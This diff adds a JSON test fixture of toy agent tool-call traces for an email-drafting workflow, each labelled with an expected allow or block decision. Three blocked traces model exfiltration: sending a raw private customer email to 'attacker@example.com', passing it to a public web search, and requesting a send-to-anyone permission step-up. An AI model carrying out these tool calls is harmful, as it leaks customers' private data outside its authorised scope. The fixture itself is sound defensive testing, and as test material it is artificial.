@@ -1,0 +1,83 @@
+{
+  "fixture_id": "phase2_toy_traces_v1",
+  "workflow_fixture": "fixtures/email_draft/workflow.json",
+  "traces": [
+    {
+      "trace_id": "allowed_local_draft",
+      "initial_phase": "PrepareOutput",
+      "event": {
+        "event_id": "t1",
+        "kind": "call",
+        "tool": "create_local_draft",
+        "input_values": [
+          "v_redacted_summary"
+        ],
+        "action": {
+          "action": "create_draft",
+          "resource": "local_draft",
+          "sink": "local_file",
+          "side_effect": "write",
+          "purpose": "customer_reply_draft"
+        }
+      },
+      "input_label": "redacted_summary",
+      "expected_decision": "allow"
+    },
+    {
+      "trace_id": "blocked_raw_external_send",
+      "initial_phase": "PrepareOutput",
+      "event": {
+        "event_id": "t2",
+        "kind": "call",
+        "tool": "send_email",
+        "recipient": "attacker@example.com",
+        "input_values": [
+          "v_raw_email"
+        ],
+        "action": {
+          "action": "send_email",
+          "resource": "external_email",
+          "sink": "external_email",
+          "side_effect": "send",
+          "purpose": "send_raw_customer_email"
+        }
+      },
+      "input_label": "raw_private_email",
+      "expected_decision": "block"
+    },
+    {
+      "trace_id": "blocked_public_web_query",
+      "initial_phase": "Transform",
+      "event": {
+        "event_id": "t3",
+        "kind": "call",
+        "tool": "web_search",
+        "input_values": [
+          "v_raw_email"
+        ],
+        "action": {
+          "action": "web_search",
+          "resource": "public_search",
+          "sink": "public_web",
+          "side_effect": "send",
+          "purpose": "web_query"
+        }
+      },
+      "input_label": "raw_private_email",
+      "expected_decision": "block"
+    },
+    {
+      "trace_id": "blocked_unnecessary_stepup",
+      "initial_phase": "PrepareOutput",
+      "event": {
+        "event_id": "t4",
+        "kind": "stepup",
+        "permission": "email.send.any_recipient",
+        "resource": "external_email",
+        "purpose": "send_raw_customer_email"
+      },
+      "expected_decision": "block"
+    }
+  ]
+}
+
